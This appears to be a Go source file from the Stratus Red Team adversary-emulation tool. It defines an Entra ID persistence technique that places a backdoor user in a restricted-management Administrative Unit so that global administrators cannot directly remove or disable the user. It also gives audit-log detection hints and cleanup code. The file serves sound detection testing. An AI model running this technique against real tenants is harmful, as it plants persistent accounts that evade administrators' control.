package entra_id

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	betagraphmodels "github.com/microsoftgraph/msgraph-beta-sdk-go/models"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
	"log"
	"strings"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "entra-id.persistence.restricted-au",
		FriendlyName: "Create Sticky Backdoor User Through Restricted Management AU",
		Description: `
Creates a [restricted management Administrative Unit (AU)](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/admin-units-restricted-management), and place a backdoor account in it to simulate a protected attacker-controlled user.

Warm-up:

- Create an Entra ID backdoor user

Detonation:

- Create restricted management Administrative Unit
- Add the backdoor user to the Administrative Unit

References:

- https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units
- https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/admin-units-restricted-management

Note: When cleaning up the technique, you might have to wait a few minutes for the user status to update before retrying the cleanup. This is a limitation of Entra ID.
`,
		Detection: `
Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the specific activity types:

- <code>Add administrative unit</code>
- <code>Add member to restricted management administrative unit</code>
`,
		Platform:                   stratus.EntraID,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	// Fetch details from TF
	backdoorUserId := params["backdoor_user_id"]
	backdoorUserName := params["backdoor_user_name"]
	suffix := params["suffix"]

	betaGraphClient := providers.EntraId().GetBetaGraphClient()
	graphClient := providers.EntraId().GetGraphClient()

	// 1. Create Restricted AU
	requestBodyAU := betagraphmodels.NewAdministrativeUnit()
	displayName := fmt.Sprintf("Stratus Red Team Restricted AU - %s", suffix)
	requestBodyAU.SetDisplayName(&displayName)
	description := "Restricted management AU created from Stratus Red Team"
	requestBodyAU.SetDescription(&description)
	restricted := true
	requestBodyAU.SetIsMemberManagementRestricted(&restricted)

	auResult, err := betaGraphClient.Directory().AdministrativeUnits().Post(context.Background(), requestBodyAU, nil)

	if err != nil {
		return errors.New("could not create AU: " + err.Error())
	}

	// 1.a. Save AU ID from creation activity
	auId := *auResult.GetId()
	log.Println("Created restricted management AU " + auId)

	// 2. Add Target member to restricted AU
	requestBodyMember := graphmodels.NewReferenceCreate()
	odataId := fmt.Sprintf("https://graph.microsoft.com/v1.0/users/%s", backdoorUserId)
	requestBodyMember.SetOdataId(&odataId)
	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Members().Ref().Post(context.Background(), requestBodyMember, nil)

	if err != nil {
		return errors.New("could not add member to AU: " + err.Error())
	}
	log.Println("Added backdoor user " + backdoorUserName + " to AU")

	portalUrl := "https://portal.azure.com/#view/Microsoft_AAD_UsersAndTenants/UserProfileMenuBlade/~/overview/userId/" + backdoorUserId + "/hidePreviewBanner~/true"
	log.Println("If you visit the following Azure portal URL, you can see the backdoor user and notice that even as a global administrator, you cannot directly remove or disable it:\n\n  " + portalUrl)

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	// AU ID from detonate
	suffix := fmt.Sprintf(" - %s", params["suffix"])

	graphClient := providers.EntraId().GetGraphClient()

	// 1. Get ID of Stratus created AU
	auResult, err := graphClient.Directory().AdministrativeUnits().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not fetch AUs: " + err.Error())
	}

	var auId string
	for _, au := range auResult.GetValue() {
		auName := *au.GetDisplayName()
		if strings.HasSuffix(auName, suffix) {
			auId = *au.GetId()
			break
		}
	}

	// 4. Delete Restricted AU
	log.Println("Deleting restricted Administrative Unit")
	err = graphClient.Directory().AdministrativeUnits().ByAdministrativeUnitId(auId).Delete(context.Background(), nil)

	if err != nil {
		return errors.New("could not delete AU: " + err.Error())
	}

	// Alert user to long wait time for cleanup. Have not found a way around this wait time.
	log.Println("[!] WARNING: The user's restricted management property usually takes 5 minutes to update.")
	log.Println("If 'stratus cleanup' fails (which is likely), please wait for 5 minutes for the user status to update and try again.")
	log.Println("This is a limitation of Entra ID.")

	return nil
}
